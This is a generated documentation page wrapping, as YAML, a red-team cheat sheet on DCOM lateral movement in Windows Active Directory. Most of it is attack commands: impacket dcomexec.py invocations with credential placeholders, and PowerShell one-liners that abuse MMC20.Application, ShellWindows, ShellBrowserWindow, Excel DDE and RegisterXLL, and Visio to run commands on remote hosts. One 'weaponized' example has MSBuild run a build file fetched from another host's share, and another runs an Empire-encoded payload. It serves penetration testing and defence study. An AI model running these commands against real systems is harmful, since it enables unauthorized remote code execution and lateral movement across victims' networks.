---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Internal - DCOM

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-internal-dcom` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-dcom.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Internal - DCOM](../../topics/active-directory/internal-dcom.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-internal-dcom |
| name | Internal - DCOM |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/internal-dcom.md |

## Preserved Source Material

````yaml
_body: "# Internal - DCOM\n\n> DCOM is an extension of COM (Component Object Model), which allows applications to instantiate\
  \ and access the properties and methods of COM objects on a remote computer.\n\n* [impacket/dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)\n\
  \n  ```ps1\n  dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]]\
  \ [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command\
  \ ...]\n  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'\n  dcomexec.py -share C$\
  \ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>' 'ipconfig'\n\n  python3 dcomexec.py -object MMC20 -silentcommand\
  \ -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST 'notepad.exe'\n  # -object MMC20 specifies that we wish to instantiate the MMC20.Application\
  \ object.\n  # -silentcommand executes the command without attempting to retrieve the output.\n  ```\n\n* [klezVirus/CheeseTools](https://github.com/klezVirus/CheeseTools)\n\
  \n  ```powershell\n  # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/\n  -t, --target=VALUE\
  \         Target Machine\n  -b, --binary=VALUE         Binary: powershell.exe\n  -a, --args=VALUE           Arguments: -enc\
  \ <blah>\n  -m, --method=VALUE         Methods: MMC20Application, ShellWindows,\n                              ShellBrowserWindow,\
  \ ExcelDDE, VisioAddonEx,\n                              OutlookShellEx, ExcelXLL, VisioExecLine, \n                   \
  \           OfficeMacro\n  -r, --reg, --registry      Enable registry manipulation\n  -h, -?, --help             Show Help\n\
  \n  Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL,\
  \ VisioExecLine, OfficeMacro.\n  ```\n\n* [rvrsh3ll/Misc-Powershell-Scripts/Invoke-DCOM.ps1](https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1)\n\
  \n  ```powershell\n  Import-Module .\\Invoke-DCOM.ps1\n  Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application\
  \ -Command \"calc.exe\"\n  Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command \"calc.exe\"\n  Invoke-DCOM\
  \ -ComputerName '10.10.10.10' -Method ServiceStart \"MyService\"\n  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow\
  \ -Command \"calc.exe\"\n  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command \"calc.exe\"\n  ```\n\n\
  ## DCOM via MMC Application Class\n\nThis COM object (MMC20.Application) allows you to script components of MMC snap-in\
  \ operations. there is a method named **\"ExecuteShellCommand\"** under **Document.ActiveView**.\n\n```ps1\nPS C:\\> $com\
  \ = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\"))\nPS C:\\> $com.Document.ActiveView.ExecuteShellCommand(\"\
  C:\\Windows\\System32\\calc.exe\",$null,$null,7)\nPS C:\\> $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\\
  System32\\WindowsPowerShell\\v1.0\\powershell.exe\",$null,\"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > \",\"\
  7\")\n\n# Weaponized example with MSBuild\nPS C:\\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\"\
  ,\"10.10.10.1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\"\
  ,$null,\"\\\\10.10.10.2\\webdav\\build.xml\",\"7\")\n```\n\n[n0tty/powershellery/Invoke-MMC20RCE.ps1](https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1)\n\
  \n## DCOM via Office\n\n* Excel.Application\n    * DDEInitiate\n    * RegisterXLL\n* Outlook.Application\n    * CreateObject->Shell.Application->ShellExecute\n\
  \    * CreateObject->ScriptControl (office-32bit only)\n* Visio.InvisibleApp (same as Visio.Application, but should not\
  \ show the Visio window)\n    * Addons\n    * ExecuteLine\n* Word.Application\n    * RunAutoMacro\n\n```ps1\n# Powershell\
  \ script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM\nInvoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9\n\
  Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a\n\n# Using Excel DDE\nPS C:\\> $excel\
  \ = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS C:\\> $excel.DisplayAlerts\
  \ = $false\nPS C:\\> $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")\n\n# Using Excel RegisterXLL\n# Can't be used reliably\
  \ with a remote target\nRequire: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted\
  \ Locations /v AllowsNetworkLocations /t REG_DWORD /d 1\nPS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"\
  Excel.Application\", \"$ComputerName\"))\nPS> $excel.RegisterXLL(\"EvilXLL.dll\")\n\n# Using Visio\n$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"\
  Visio.InvisibleApp\", \"$ComputerName\"))\n$visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")\n```\n\
  \n## DCOM via ShellExecute\n\n```ps1\n$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"10.10.10.1\"\
  )\n$obj = [System.Activator]::CreateInstance($com)\n$item = $obj.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\"\
  ,\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n```\n\n## DCOM via ShellBrowserWindow\n\n:warning: Windows 10 only,\
  \ the object doesn't exists in Windows 7\n\n```ps1\n$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',\"\
  10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\"\
  ,\"C:\\windows\\system32\",$null,0)\n```\n\n## References\n\n* [Lateral movement via dcom: round 2 - enigma0x3 - January\
  \ 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)\n* [New lateral movement techniques abuse\
  \ DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)"
_relative_path: active-directory/internal-dcom.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-dcom.md
````
